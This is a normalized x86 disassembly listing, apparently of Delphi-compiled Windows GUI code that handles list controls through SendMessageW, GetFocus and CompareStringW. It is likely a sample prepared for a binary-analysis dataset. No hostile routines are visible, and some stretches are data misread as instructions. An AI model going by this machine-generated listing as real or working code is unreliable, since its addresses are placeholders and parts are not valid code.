mov eax [ ebp - 0x8 ]
add eax 0x2e4
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_48e064
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x2ec ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2f4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov eax [ ebp - 0x8 ]
mov [ eax + 0x2e8 ] 0x0
retn
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4aeae0
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
push 0x0
push 0x0
push 0x407
mov eax [ ebp - 0x8 ]
call sub_496868
push eax
call SendMessageW
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2f4 ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x30 ]
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x2f4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4af498
mov edx eax
test edx edx
je r-xdata
lea eax [ ebp - 0x4 ]
call sub_44b8f0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c8 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4aecc0
sub edx 0xffffffec
sub_4aeb14
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
xor edi edi
movzx eax [ esp ]
mov [ ebx + 0x2f1 ] al
mov eax ebx
call sub_496c14
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov esi rw-data
jae r-xdata
and edx 0x7f
bt [ ebx + 0x2f1 ] edx
inc eax
add esi 0x4
cmp al 0x5
jne r-xdata
or edi [ esi ]
mov edx eax
cmp dl 0x7
ja r-xdata
push edi
push 0x0
push 0x40e
mov eax ebx
call sub_496868
push eax
call SendMessageW
sub_4aeb74
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_497514
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0xa4 ]
mov eax edi
call sub_4ae54c
cmp [ edi + 0x2e0 ] 0x0
jne r-xdata
mov edx [ esi + 0xc8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xdc ]
inc eax
je r-xdata
test bl bl
je r-xdata
sub_4aebd8
push ebx
mov ebx eax
mov eax ebx
call sub_45ca3c
movzx eax [ r-xdata ]
and ax [ ebx + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov eax ebx
call sub_492ec4
sub_4aec20
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x2f4 ]
call sub_4254d8
test eax eax
jle r-xdata
mov eax ebx
call sub_492bec
pop esi
pop ebx
retn
cmp [ ebx + 0x2e4 ] 0x0
jne r-xdata
test [ ebx + 0x55 ] 0x20
je r-xdata
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4252bc
mov esi eax
mov [ ebx + 0x2e4 ] esi
mov edx [ ebx + 0x2f4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
mov [ ebx + 0x2ec ] eax
sub_4aec84
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_496c14
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x2a0 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x2a4 ]
je r-xdata
cmp eax [ esi + 0x2d0 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_4aecc0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4aedbf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_496c14
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4aedc6
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
cmp [ ebx + 0x2c8 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
call sub_44b8d8
mov ecx eax
mov edx r-xdata
mov eax [ ebx + 0x2c8 ]
call sub_43bff8
test al al
je r-xdata
test [ ebx + 0x2cc ] 0x1
setne al
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x2c8 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
movzx eax [ r-xdata ]
cmp al [ ebx + 0x2cc ]
jne r-xdata
xor eax eax
test [ ebx + 0x2cc ] 0x1
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
jmp r-xdata
test [ ebx + 0x2cc ] 0x2
je r-xdata
or eax 0x1
test [ ebx + 0x2cc ] 0x4
je r-xdata
or eax 0x2
test [ ebx + 0x2cc ] 0x8
je r-xdata
or eax 0x4
test [ ebx + 0x2cc ] 0x10
je r-xdata
or eax 0x8
test [ ebx + 0x2cc ] 0x20
je r-xdata
or eax 0x10
test [ ebx + 0x2cc ] 0x40
je r-xdata
or eax 0x20
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
jmp r-xdata
or eax 0x40
sub_4aedca
add [ eax ] al
ror [ ebx - 0x40 ] 0xea
xchg ecx eax
aaa
rcl [ ecx ] cl
mov ebx 0x97600095
jpo r-xdata
nop
nop
nop
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov eax [ eax + 0x20 ]
call sub_4ae028
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax ebx
call sub_425180
pop edi
pop esi
pop ebx
retn
dec esp
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_496868
mov edx [ esi + 0x8 ]
mov [ edx + 0xc ] eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_4aee00
push ebx
push esi
mov esi edx
mov eax [ eax + 0x20 ]
call sub_4ae028
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax ebx
call sub_425180
pop esi
pop ebx
retn
sub_4aee54
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_4aeebb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_425430
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_496c14
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4aeec2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
xor ecx ecx
mov edx 0xb033
call sub_48f2b0
sub_4aeec8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_45b760
mov eax edi
mov edx [ eax ]
call [ edx + 0x98 ]
push eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x94 ]
mov ecx esi
mov dl 0x1
call [ eax + 0x2c ]
mov [ edi + 0x20 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_4aef20
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
lea eax [ esi + 0x20 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45b798
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_4aef64
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_448b58#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebx + 0x20 ]
call sub_46a858
mov edx [ eax + 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_449d80
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_46a858
mov eax [ eax + 0x10 ]
push eax
mov edx edi
mov eax [ ebx + 0x20 ]
call sub_46a858
pop edx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_46a858
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx edi
mov eax [ ebx + 0x20 ]
call sub_46a858
mov eax [ eax + 0x18 ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_46a858
mov eax [ eax + 0x18 ]
push eax
mov edx edi
mov eax [ ebx + 0x20 ]
call sub_46a858
pop edx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_46a858
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx edi
mov eax [ ebx + 0x20 ]
call sub_46a858
mov eax [ eax + 0x1c ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_46a858
mov eax [ eax + 0x1c ]
push eax
mov edx edi
mov eax [ ebx + 0x20 ]
call sub_46a858
pop edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_46a858
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx edi
mov eax [ ebx + 0x20 ]
call sub_46a858
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_46a858
mov eax [ eax + 0x20 ]
push eax
mov edx edi
mov eax [ ebx + 0x20 ]
call sub_46a858
pop edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_46a858
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4af0a8
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_4af0b0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_46a858
mov edx [ eax + 0x10 ]
mov eax edi
call sub_449d2c
pop edi
pop esi
pop ebx
retn
sub_4af104
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4af20e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x20 ]
call sub_4254d8
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4af215
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov edi eax
test edi edi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push edi
mov eax [ ebp - 0x8 ]
call sub_449db8
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
push 0x1
push 0x400
call CompareStringW
sub eax 0x2
test eax eax
jne r-xdata
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4494dc
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
mov [ ebp - 0x14 ] esi
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x20 ]
mov edx esi
call sub_46a858
mov edx [ eax + 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_449d80
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
call sub_449d80
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub_4af23c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_46a858
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x14 ]
pop edi
pop esi
pop ebx
retn
sub_4af25c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_46a858
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
pop edi
pop esi
pop ebx
retn
sub_4af27c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x1c ]
call sub_496c14
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x1c ]
call sub_496868
push eax
call SendMessageW
xor bl 0x1
test bl bl
je r-xdata
mov eax [ esi + 0x1c ]
call sub_48e5a8
sub_4af2cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_4af334
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x28c ]
call sub_4a8150
mov ebx eax
mov ecx esi
xor edx edx
mov eax ebx
call sub_4a7d90
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4a7bcc
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_4a7c80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4af33b
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_4af344
push ebx
push esi
mov esi edx
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x28c ]
call sub_4a8150
mov ebx eax
mov ecx [ esi + 0x18 ]
xor edx edx
mov eax ebx
call sub_4a7d90
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_4a7bcc
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_4a7c80
pop esi
pop ebx
retn
sub_4af37c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x9c ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x20 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4483ac
mov edx edi
mov eax esi
call sub_4ac408
sub_4af3b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_4af410
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_4483ac
push esi
push 0xffffffff
push 0xffffffff
mov edx [ ebp + 0x8 ]
push edx
mov eax [ eax + 0x2f4 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_4ae034
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4af417
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_4af420
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_4483ac
mov edx [ ebx + 0x18 ]
push edx
push 0xffffffff
push 0xffffffff
mov ecx [ ebx + 0x14 ]
push ecx
mov eax [ eax + 0x2f4 ]
mov ecx edx
mov edx [ ebx + 0x10 ]
call sub_4ae034
pop esi
pop ebx
retn
sub_4af454
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebx + 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4af498
mov esi eax
mov eax [ ebp + 0xc ]
mov edx esi
test edx edx
je r-xdata
xor edx edx
mov [ eax ] edx
call sub_44b8f0
mov eax [ ebx + 0x10 ]
mov [ esi + 0x10 ] eax
xor eax eax
pop esi
pop ebx
pop ebp
retn 0x8
sub edx 0xffffffec
sub_4af498
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_448180
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_4af4e0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xc ]
call sub_46a858
mov edx [ eax + 0x10 ]
mov eax edi
call sub_449d2c
pop edi
pop esi
pop ebx
retn
sub_4af504
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push j_sub_448b58#7
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_4af4d4
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jge r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ ebp - 0xc ]
jl r-xdata
cmp ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ eax ] ebx
lea ecx [ ebp - 0x14 ]
mov edx [ esi + 0x10 ]
mov eax esi
call sub_4af4e0
mov edx [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
call sub_449f90
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
mov ebx 0x1
xor ebx ebx
jmp r-xdata
mov eax edi
add eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x2
push eax
call CoTaskMemAlloc
mov edx [ ebp + 0x10 ]
mov [ edx + ebx * 4 ] eax
mov edx [ ebp - 0x8 ]
add edx 0x2
mov eax [ ebp + 0x10 ]
mov eax [ eax + ebx * 4 ]
xor ecx ecx
call sub_447ae4
mov eax [ ebp + 0x10 ]
mov eax [ eax + ebx * 4 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4476cc
inc ebx
inc [ esi + 0x10 ]
sub edi 0x4
mov eax [ edi ]
shr eax 0x1
mov edi eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4af5ee
lea eax [ ebp - 0x14 ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call sub_4499d8
retn
sub_4af610
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_4af4d4
mov edx [ ebp + 0xc ]
add [ ebx + 0x10 ] edx
cmp eax [ ebx + 0x10 ]
jle r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
mov eax 0x1
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_4af63c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_4af6a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call j_sub_44a294
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4af6ac
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_449d2c
mov eax [ ebx + 0x4 ]
call sub_4aff88
test [ eax + 0x1c ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_4aff88
call sub_4ac8e8
sub_4af6b0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push j_sub_448b58#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
call j_sub_44a294
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4af720
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
lea eax [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_449d2c
mov eax [ ebx + 0x4 ]
call sub_4aff88
test [ eax + 0x1c ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_4aff88
call sub_4ac8e8
sub_4af724
sub bh dh
dec edx
add [ ecx ] dl
push cs
cmp dl [ esp + ecx * 2 + 0x69 ]
jae r-xdata
test esi esi
jl r-xdata
inc edi
jb r-xdata
mov eax [ ebx + 0x4 ]
call sub_4aff88
mov eax [ eax + 0x28c ]
call sub_4a81b8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_4aff88
test [ eax + 0x1c ] 0x1
jne r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4af8d9
lea eax [ ebp - 0x4 ]
mov edx [ sub_4af724 ]
call sub_44b0fc
retn
inc edi
dec esi
jne r-xdata
xor edi edi
idiv [ ebp + ebx + 0x46 ]
cmp dh [ cs : ecx ]
add al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
insb
push esi
inc esp
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x14 ] eax
mov eax [ ebx + 0x4 ]
call sub_4aff88
test [ eax + 0x1c ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_4aff88
call sub_496868
push 0x0
mov edx [ ebx + 0x14 ]
push edx
push 0x1096
push eax
call SendMessageW
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44af28
inc eax
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ sub_4af724 ]
call sub_44b0f0
add esp 0x4
mov eax [ ebp - 0x4 ]
call sub_44af28
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 4 - 0x4 ] edi
mov edx edi
mov eax [ ebx + 0x4 ]
call sub_4afe4c
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
insb
jae r-xdata
mov eax [ ebp - 0x4 ]
call sub_44af28
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x4 ]
call sub_4aff88
call sub_4ac8e8
mov eax [ ebx + 0x4 ]
call sub_4aff88
mov eax [ eax + 0x28c ]
mov edx edi
call sub_4a81f0
mov eax [ eax + 0x2c ]
cmp eax [ ebx + 0x14 ]
jne r-xdata
cld
call sub_449d2c
mov eax [ ebx + 0x4 ]
call sub_4aff88
test [ eax + 0x1c ] 0x1
jne r-xdata
nop
nop
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4af8d2
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ sub_4af724 ]
call sub_44b0f0
add esp 0x4
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x14 ]
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4af720
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax [ ebx + 0x4 ]
call sub_4aff88
call sub_4ac8e8
mov eax [ ebx + 0x4 ]
call sub_4254d8
mov esi eax
dec esi
mov eax [ ebx + 0x4 ]
call sub_4aff88
mov eax [ eax + 0x28c ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + edi * 4 ]
call sub_4a81f0
mov edx [ ebx + 0x14 ]
call sub_4a7b44
inc edi
dec esi
jne r-xdata
sub_4af8e0
push ebx
push esi
push edi
mov ebx eax
movzx esi [ ebx + 0x18 ]
mov eax [ ebx + 0x4 ]
call sub_4aff88
call sub_496c14
test al al
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
movzx esi [ ebx + 0x18 ]
mov eax [ ebx + 0x4 ]
call sub_4aff88
call sub_496868
push 0xffffffff
mov edx [ ebx + 0x14 ]
push edx
push 0x105c
push eax
call SendMessageW
mov edi eax
movzx eax [ r-xdata ]
not eax
and ax si
mov esi eax
test edi 0x2
je r-xdata
test edi 0x1
je r-xdata
or si 0x2
test edi 0x10
je r-xdata
or si 0x4
test edi 0x20
je r-xdata
or si 0x20
test edi 0x40
je r-xdata
or si 0x40
test edi 0x80
je r-xdata
or si 0x80
mov [ ebx + 0x18 ] si
or si 0x100
sub_4af988
push ebx
push ecx
mov [ esp ] dx
mov ebx eax
movzx eax [ esp ]
cmp ax [ ebx + 0x18 ]
je r-xdata
pop edx
pop ebx
retn
movzx eax [ esp ]
mov [ ebx + 0x18 ] ax
mov eax [ ebx + 0x4 ]
call sub_4aff88
test [ eax + 0x1c ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_4aff88
call sub_4ac8e8
sub_4af9c0
push ebx
mov ebx eax
cmp dl [ ebx + 0x1a ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x1a ] dl
mov eax [ ebx + 0x4 ]
call sub_4aff88
test [ eax + 0x1c ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_4aff88
call sub_4ac8e8
sub_4af9e8
push ebx
mov ebx eax
cmp dl [ ebx + 0x1b ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x1b ] dl
mov eax [ ebx + 0x4 ]
call sub_4aff88
test [ eax + 0x1c ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_4aff88
call sub_4ac8e8
sub_4afa10
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_4afa79
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x1c ]
mov edx [ ebp - 0x4 ]
call j_sub_44a294
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4afa80
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
lea eax [ ebx + 0x1c ]
mov edx [ ebp - 0x4 ]
call sub_449d2c
mov eax [ ebx + 0x4 ]
call sub_4aff88
test [ eax + 0x1c ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_4aff88
call sub_4ac8e8
sub_4afa84
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push j_sub_448b58#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x20 ]
mov edx [ ebp - 0x4 ]
call j_sub_44a294
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4afaf4
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
lea eax [ ebx + 0x20 ]
mov edx [ ebp - 0x4 ]
call sub_449d2c
mov eax [ ebx + 0x4 ]
call sub_4aff88
test [ eax + 0x1c ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_4aff88
call sub_4ac8e8
sub_4afaf8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push j_sub_448b58#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call j_sub_44a294
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4afb68
lea eax [ ebp - 0x4 ]
